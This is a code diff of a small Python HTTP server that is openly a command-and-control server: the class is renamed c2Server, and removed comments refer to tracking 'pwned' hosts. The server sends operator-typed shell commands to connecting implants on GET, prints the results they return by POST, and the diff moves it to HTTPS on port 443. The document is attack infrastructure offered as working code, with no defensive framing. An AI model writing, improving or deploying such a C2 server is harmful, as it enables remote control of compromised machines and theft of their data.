@@ -1,32 +1,22 @@
 from http.server import *
-import random
-import string
-import logging
-# from command_control.models import pwnedHost
-# from extra.scratchpad2 import Server_Response
+import random, string, ssl
 
 chars = string.ascii_letters + string.digits
 session_value = ''.join(random.choice(chars) for i in range(20))
 
 
-class Server_Response(BaseHTTPRequestHandler):
+class c2Server(BaseHTTPRequestHandler):
 
     def set_headers(self):
-        #ip = self.client_address[0]
-        #if not pwnedHost.objects.filter(ip=ip):
-        #    host = pwnedHost(author=author, ip=ip, port="3389", username="root")
-        #    host.save()
         self.send_response(200, "ok")
         self.send_header('Content-type', 'text/html')
         self.send_header('Set-Cookie',session_value)
-        # self.send_header('Server', 'Microsoft IIS/7.5')
         self.end_headers()
 
     # Allow GET
     def do_GET(self):
         self.set_headers()
-        # message = raw_input("Enter command :  " )
-        message = "id"
+        message = input("$ ")
         self.wfile.write(message.encode('utf-8'))
 
     # Allow POST
@@ -34,19 +24,17 @@ class Server_Response(BaseHTTPRequestHandler):
         self.set_headers()
         print("data received")
         print(self.client_address[0])
-        content_length = int(self.headers['Content-Length'])  # <--- Gets the size of data
+        content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length)
-        data = post_data.decode('utf-8')# <--- Gets the data itself
+        data = post_data.decode('utf-8')
         print(data)
-        # logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n",str(self.path), str(self.headers), post_data.decode('utf-8'))
-        # print(BaseHTTPRequestHandler.responses)
-        # self.wfile.write("<html><body><h1>POST!</h1></body></html>")
+
 
 def run():
     print("Server Started ..!!")
-    server_address = ('', 80)
-    httpd = HTTPServer(server_address, Server_Response)
-    # httpd.socket = ssl.wrap_socket(httpd.socket, certfile='./server.pem', server_side=True)
+    server_address = ('', 443)
+    httpd = HTTPServer(server_address, c2Server)
+    httpd.socket = ssl.wrap_socket(httpd.socket, certfile='server.cert', keyfile="server.key",  server_side=True)
     print('running server...')
     httpd.serve_forever()
 
